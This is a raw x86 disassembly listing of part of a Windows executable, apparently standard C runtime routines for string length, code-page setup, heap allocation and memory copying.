  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
